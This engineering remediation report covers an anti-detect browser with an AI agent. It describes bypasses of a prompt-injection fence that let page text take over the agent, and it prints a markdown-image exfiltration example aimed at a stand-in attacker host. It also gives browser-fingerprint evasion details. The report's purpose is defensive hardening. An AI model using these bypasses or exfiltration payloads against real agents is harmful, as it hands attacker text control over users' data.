# Remediation pass — 2026-08-29

Closes the gaps listed in `2026-08-29-engineering-review.md` §5 and
`2026-08-29-backend-billing-agent-review.md` §5, **excluding** code signing and the real-GPU host,
which were explicitly descoped.

Every claim below was verified by running the thing, not by reading it. Where something is *not*
finished, it says so and says what is left.

---

## 1. Fixed and verified

### 1.1 `sanitizeUntrusted` was case-sensitive — prompt-injection fence bypass

`packages/agent/src/prompt.ts`. The delimiter strip carried `g` but no `i`, while the chat-marker
strip on the very next line *did* carry `i`. So `end_untrusted_local_memory` passed through verbatim
and closed the fence, giving page-derived text harness authority for the rest of the run.

Rewritten to strip invisible characters first (soft hyphen, the zero-width/bidi block, word joiner,
invisible operators, BOM), NFKC-fold, then match case-insensitively with `[^A-Za-z0-9]*` between
words. The character classes are built from code points rather than written literally, so a
zero-width space in the class cannot be invisible to the next reader — which is the whole problem
being solved.

Sixteen bypass variants are now covered by test: lowercase, mixed case, zero-width space, soft
hyphen, bidi override, the bidi isolates, hyphen/space/doubled-underscore separators, fullwidth
`END`, and — added after review — control characters planted MID-WORD (NUL, C0, DEL, C1) in both a
fence name and inside `BEGIN`. A further test pins the blast radius of deliberate over-matching:
ordinary prose containing the fence words survives.

**A blocker was found here in pre-push review, in this very fix.** The first version stripped control
characters at the END of the chain, after the delimiter match. Because the separators in the pattern
sit BETWEEN words, `END_UNTRUSTED_LOCAL_ME<NUL>MORY` did not match — and the trailing strip then
deleted the NUL and handed the model a byte-exact delimiter. Worse than a missed case: the widened
class (~65 code points, up from the single NUL it replaced) turned 64 previously-inert
forgeries into working ones, and C1 (U+0080–U+009F) reaches `sanitizeUntrusted` intact because the
upstream `text()` cleaner strips only C0 and DEL. The rule is now explicit in the code: **every
character that can be deleted must be deleted BEFORE the match**, and nothing after the match may
delete anything. The regression tests fail against the old ordering — verified by restoring it.

**Known limit, not closed:** homoglyph substitution (Cyrillic `Е` for ASCII `E`) still passes.
Folding confusables is a much larger hammer and a homoglyph delimiter is correspondingly less likely
to read as authoritative. Recorded rather than half-done.

### 1.2 Authorization was opt-in per controller

Global `APP_GUARD` + `@Public()` (`apps/backend/src/auth/`). This found **no vulnerability** — every
route already carried its guard. What it changes is the failure mode: forgetting one used to ship an
open endpoint that looked healthy, and now fails a test.

`global-guard.e2e.spec.ts` pins both halves. A deliberately bare controller — no `@UseGuards`, no
`@Public`, the exact shape of the mistake — must 401. And the public surface is asserted by
reflection over the live route table as an exact 10-entry set, so adding one is a visible diff rather
than a silent decision. The redundant per-route `JwtAuthGuard` decorators were removed; they would
otherwise run the guard twice per request (two `verifyAsync`, two user lookups).

### 1.3 `resolveTeamId` duplicated five times

Five semantically identical private copies of an authorization rule (they differ only in brace
style and parameter name, which is precisely what makes the duplication easy to miss) — agent-token, api-keys, audit, billing,
profiles — replaced by `apps/backend/src/teams/resolve-team-id.ts`. 20 call sites rewired. A free
function, not a service, so every caller keeps its existing `TEAMS_REPOSITORY` injection and no
module graph changes.

### 1.4 `providerPaymentId` unique constraint

**Already correct** — `apps/backend/prisma/schema.prisma:565`. Verified, no change. The exactly-once
crediting guarantee rests on it, and it is real.

### 1.5 Artifact-vs-tree provenance was unenforced (four incidents)

New `ci/validation/engine-archive-gate.mjs`. Opens a published archive the way a consumer does,
recomputes the per-file ledger from the bytes actually present, and refuses anything that disagrees
with its own `LOBSTER_ENGINE.json` attestation. Streams both zip and tar.gz, so a ~1 GB runtime never
lands in memory.

Measured against the real published artifact:

```
sha256    adcbb43d7cc33c2f5ca1b42fc059e2971259f0f05aa3e2701bf5d0e8e3c797bd
  ok    tree hash matches attestation (554 files)
  ok    all 554 attested files match byte-for-byte
  ok    revision d351507161eb exists in this repository
  ok    21 native capabilities declared, including font-isolation, device-frame
  ok    manifest digest matches this archive
ENGINE ARCHIVE GATE: PASSED
```

And against the superseded archive, which it rejects on two independent grounds — including that it
was packaged from a dirty working tree, i.e. from source that corresponds to no commit.

Eleven tests (`engine-archive-gate.test.mjs`) — nine negative, two positive. The negative ones cover
modified / removed / added file, missing capability, dirty tree, unknown revision, absent marker, a
non-archive, and an unattested archive under `--require-attestation`; the positive ones pin that a
self-consistent archive passes and that a Linux-shaped v1 marker is NOT blocked. They also give the
tar.gz reader its first coverage in the repo. A gate that has only ever been run against a good
artifact is indistinguishable from `exit 0`; the negative cases are what make it real.

Wired into `gate:engine` and into `bump-engine-version.mjs`, which is the publish chokepoint, so it
cannot be skipped by forgetting.

### 1.6 A live bug the gate exposed: `--platform` defaults to `linux-x64`

`bump-engine-version.mjs` silently defaulted the platform. Feeding it the **Windows** archive
reported `linux-x64 version+url+sha256 updated`. Publishing that way writes a win-x64 digest into the
Linux entry: first-run provisioning then 404s or digest-mismatches for every Linux user, and the
artifact that *is* correct never gets published. Same shape as the backwards-filenames incident,
reachable through a flag default rather than a filename.

Fixed by making the archive's own declared platform authoritative:

```
error: platform mismatch: lobium-win-x64-152.0.7977.42.zip declares 'win-x64',
  but this bump targets 'linux-x64' (the DEFAULT — you did not pass --platform).
  Publishing it would write a win-x64 digest into the linux-x64 manifest entry.
  Re-run with --platform win-x64.
```

All verification runs used `--dry-run`; no manifest was written.

### 1.7 TLS through the proxy shim — measured, and it is clean

`ci/validation/tls-through-proxy.mjs`. The direct handshake was already known to match stock Chrome,
but essentially no real profile connects directly: every profile with proxy credentials goes through
`startLocalProxyAdapter`, because Chromium cannot carry those credentials itself. (Credentials are
the common case, not the only one — the launcher also routes through the shim for other reasons; the
shim path is broader than "profiles with proxy credentials".) That path had never been measured.

Same binary, same endpoint, only the proxy differing:

| field | direct | via shim |
| --- | --- | --- |
| `ja3n_hash` | `a3a3161a080b73bda9cc285fb367fcc0` | identical |
| `ja4` | `t13d1518h2_8daaf6152771_4980c97edce0` | identical |
| `ja4_r` | full cipher + extension list | identical |
| `akamai_hash` | `52d84b11737d980aef856699f885ca86` | identical |
| `ja3_hash` | differs run to run — GREASE (RFC 8701), excluded from the verdict | |

The shim tunnels `CONNECT` and never terminates TLS. That was the architectural expectation; it is
now a measurement.

**Consequence for the series:** `net/tls-ja3-ja4.patch` and `net/http2-settings-order.patch` are
listed as NOT YET AUTHORED and on this evidence are **unnecessary**. The fork inherits Chrome's
BoringSSL handshake unmodified, which is the goal. Writing them could only make it *less* like
Chrome's.

### 1.8 `getCapabilities()` on persona media devices — was already fixed

The review listed this as an open one-call tell. It was reading the stale audit register: the fix is
in `media-devices.patch`, and `git merge-base --is-ancestor` confirms that patch is in the shipped
engine's revision.

Verified by probing the shipped binary rather than trusting the graph, and compared against stock
Chrome 152 on the same host:

* `videoinput` → `aspectRatio, deviceId, facingMode, frameRate, groupId, height, resizeMode, width`
* `audioinput` → `autoGainControl, channelCount, deviceId, echoCancellation, groupId, latency,
  noiseSuppression, sampleRate, sampleSize, voiceIsolation`
* `audiooutput` → no `getCapabilities` at all

**Stock Chrome returns byte-identical key sets on all three.** (`audiooutput` correctly has none —
those are plain `MediaDeviceInfo`, not `InputDeviceInfo`.) The only difference is the persona's
declared speaker count, which is the intent. **Closed.**

### 1.9 The Windows product produced no logs at all

Two compounding causes, both in shipped code:

1. `tracing_subscriber::fmt()` writes to stdout, and a Tauri app is built for the Windows GUI
   subsystem — **no console is attached**, so every line went to a handle nobody could read. There
   was no file sink.
2. Sidecar stderr was logged at `debug!` under an `INFO` max level, so it was discarded before
   reaching any sink even where a console existed.

This is why the phantom first launch has never been explained: the one component that knows what
happened was writing its reason into a void.

Fixed: `init_logging()` writes to `%LOCALAPPDATA%\lobster\logs\lobster.log`
(`~/.local/share/lobster/logs` on Unix), defaulting to DEBUG, rotating at 8 MB so a crash-and-relaunch
does not destroy the evidence, `LOBSTER_LOG` to override. No new crate — `MakeWriter` is implemented
for closures. Sidecar stderr raised to `info!`. 218 Rust unit tests pass. (One doctest,
`open_in_browser`, fails — verified pre-existing on the clean tree, not from this change.)

### 1.10 An unauthenticated loopback endpoint in the agent bridge

`GET /health` answered `{ok: true}` *before* the token gate. Nothing called it — not the panel, not
the service worker, not the automation SDK, which has its own documented unauthenticated health on a
different service. For an anti-detect product a nameable loopback endpoint that answers without
credentials is the wrong shape: anything reaching loopback gets a positive identification of the
browser it is in. Removed.

### 1.11 Documentation drift

`docs/STATUS.md` stated the Windows no-pack font path "fails open", with a correction block
underneath contradicting it. A reader of the paragraph got the false claim. The body now states the
measured behaviour and the block records that it was corrected. `networkTls`/`networkHttp2` are no
longer described as unmeasured (§1.7). `lobium/hooks.md` was already correct — its superseded claims
are quoted as history, which is the right pattern.

---

## 2. Landed but NOT yet proven end to end

### 2.1 Native `(pointer:)` / `(hover:)` for mobile personas

`lobium/patches/fingerprint/media-values-pointer-hover.patch`, registered in the series with its
capability mapping.

These media features were answered **only** by `Emulation.setDeviceMetricsOverride {mobile:true}`
sent over CDP after launch. That contradicts the product's own principle — the fingerprint is set by
the binary before the first script — and is weaker in three specific ways: it races a synchronous
inline script on the first navigation; it misses any target the installer did not attach to (a
desktop-shaped tab in a mobile-shaped browser, worse than either answer alone); and it reverts every
tab to desktop semantics if the socket closes mid-session.

Keyed on a TOUCH-PRIMARY persona: `ua_mobile` **OR** `ua_form_factor == "Tablet"`.

Both halves are needed, and the first draft of this patch had only the first — pre-push review caught
it. Android **tablets set `uaMobile = false` on purpose**, because real tablet Chrome omits the
"Mobile" UA token (`packages/fingerprint/src/android.ts` asserts exactly that). Keying on `ua_mobile`
alone would leave every tablet persona reporting `(pointer: fine)` and `(hover: hover)` from the
renderer while the CDP layer said the opposite — a contradiction inside one browser, which is worse
than either answer alone. Deliberately **not** keyed on `max_touch_points`: a touchscreen laptop has
touch points *and* a genuine fine pointer with hover, and its form factor is `"Desktop"`, so it is
correctly excluded.

State: applies cleanly, **compiles** (`media_values.obj` rebuilt against the patched tree), series
gate green.

**Not done:** a full engine rebuild and link (~8–12 h), then measuring `matchMedia('(pointer:
coarse)')` on an Android persona against a real Android Chrome. Until that happens this patch is
compiled, not proven, and the CDP path is still what actually delivers the behaviour at runtime. The
CDP commands stay regardless — they also supply touch-event emission and the visual viewport, which
are not media features.

---

## 2.5 What the pre-push review changed

Before pushing, the whole diff went through an adversarial review — seven reviewers by risk
dimension, each finding verified by three independent skeptics prompted to REFUTE it, majority
rules. 21 findings raised, 45 of 63 verdicts refuted. What survived, and was fixed:

| Severity | Finding | Resolution |
| --- | --- | --- |
| blocker | Control chars stripped AFTER the fence match reassembled a byte-exact delimiter | Reordered; 7 mid-word regression cases added (§1.1) |
| high | The mandatory gate would reject **every archive the Linux packager can produce** | Gate now holds each artifact to the schema it declares (below) |
| high | Native pointer/hover excluded Android **tablets** | Re-keyed on touch-primary, recompiled (§2.1) |
| high | `readTarGz` was quadratic in entry size | Rewritten as a streaming state machine (below) |
| high | STATUS.md generalised one Android measurement into a universal claim | Narrowed to what was measured |
| medium | `INVISIBLE_CODEPOINTS` skipped U+2066–U+2069, the modern bidi isolates | Range extended to the whole 2060–206F block |
| medium | `init_logging()` silenced console output on **Linux** for a Windows-only reason | Windows goes file-only; elsewhere tees to stderr too |
| medium | Capability comment still said pointer/hover come "NOT from the binary at all" | Reconciled, and marked as not-yet-rebuilt |
| medium | `extractOne` decompressed the whole tar.gz a second time to read one file | Single-pass capture in the reader |
| medium | bump resolved `--tarball` against the caller's cwd but spawned the gate with `cwd: ROOT` | Path resolved to absolute |
| medium | The platform cross-check **failed open** on a marker with no `platform` | Now a hard failure |
| medium | Argv scan could pick a flag's VALUE as the archive path | Value-consuming flags enumerated |
| low | Dead `JwtAuthGuard`/`UseGuards` imports in 8 controllers | Removed |
| low | Orphaned JSDoc for the deleted `resolveTeamId` | Removed — 4 sites, not the 1 reported |
| low | An archive containing no engine at all passed | `chrome`/`chrome.exe` presence now required |
| low | Three miscounts in this document | Corrected |

**The gate is schema-aware, and this matters for the Linux side.** The Windows packager writes
`schemaVersion: 2` — a per-file ledger, tree hash, source revision, capability set.
`scripts/package-lobium-runtime.sh` still writes the original minimal marker (engine, platform,
chrome, fonts, packagedAt). Holding a v1 artifact to the v2 contract would have refused every Linux
publish, and a gate that blocks the only working path on a platform gets switched off. So each
artifact is held to the contract it declares: **v2 is verified in full and blocks on any
discrepancy; v1 is reported `UNATTESTED` and does not block**, with the message naming exactly what
the packager must emit. `--require-attestation` closes the hatch once both packagers emit v2.

**Making the Linux packager emit a v2 marker is the natural next task for the Linux host** — that is
what turns the gate from advisory to enforcing on that platform. The Windows implementation
(`Get-ArtifactLedger` in `scripts/package-lobium-runtime.ps1`) is the reference: sort forward-slash
relative paths ordinally, exclude the marker itself, hash the UTF-8 of
`"<path>	<bytes>	<sha256>
"` concatenated over every file.

**The tar reader was rewritten** because the Linux artifact is the one that exercises it. The first
version accumulated each entry body with repeated `Buffer.concat`, which is quadratic in entry size —
and the Linux tarball's `chrome` entry alone is ~200 MB. It is now a state machine that hashes each
chunk and drops it, so peak memory is one chunk regardless of archive size. Measured: a synthetic
220 MB-entry tarball verifies in **18.5 s** with flat memory.

---

## 3. Still open

| Gap | Why it is still open |
| --- | --- |
| Phantom first launch | Root cause still unknown. The logging fix (§1.9) is the prerequisite and is done; the next step is reproducing it on a build that carries the fix and reading `lobster.log`. Narrowed: `start_profile_via_sidecar` refuses to report success without a live debugger endpoint, so a browser **did** answer CDP and then died — this is a post-start death, not a failure to start. The Windows job object (`JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE`, which child processes join automatically) is the prime suspect, and was deliberately **not** changed on a hypothesis. |
| 25 `UNVERIFIED` audit findings | Not addressed in this pass. §1.8 is a warning about their staleness: at least one was already fixed and shipping while the register still listed it open. The register needs a re-verification sweep, not trust. |
| Single origin / no CDN | Infrastructure, not code. 78 MB/s vs 5.6 MB/s measured on the same day, and one origin is a single point of failure for every first run. |
| Code signing, real GPU | Descoped by explicit instruction. |

---

## 4. Test state

| Suite | Result |
| --- | --- |
| `packages/agent` | 227 / 227 |
| `apps/backend` | 330 pass, 0 fail, 1 skipped |
| `packages/engine-runner` | 291 pass, 0 fail |
| `packages/lobee-app` | 56 / 56 |
| `gate:engine` | 72 / 72 |
| `apps/desktop/src-tauri` | 218 pass (1 pre-existing doctest failure, unrelated) |

New gates: `npm run gate:engine-archive <archive>`, `npm run gate:tls-proxy <engine>`.

---

## 5. Note on `packages/lobee-app`

Reviewed for the first time (neither prior review touched it) and it is among the better-engineered
packages in the repo. Manifest is minimally scoped — `["sidePanel","storage"]`, loopback-only host
permission, **no content scripts**, so it never touches page context. `md.ts` builds nodes only via
`createElement`/`textContent`; there is no `innerHTML` anywhere in the package. URL scheme allowlist,
`data:` for `<img>` only, never links. Bridge auth is a 256-bit per-profile token, CORS reflects only
`chrome-extension://` origins, and the custom header forces a preflight.

Worth singling out: remote images in model output are deliberately downgraded to click-through links,
because `![](https://evil.tld/p?d=<what the agent scraped>)` is a zero-click exfiltration channel that
fires the moment the answer renders. That is a subtle attack, anticipated and closed, with the
manifest's `img-src 'self' data:` enforcing the same rule a layer down. One finding, §1.10, now fixed.
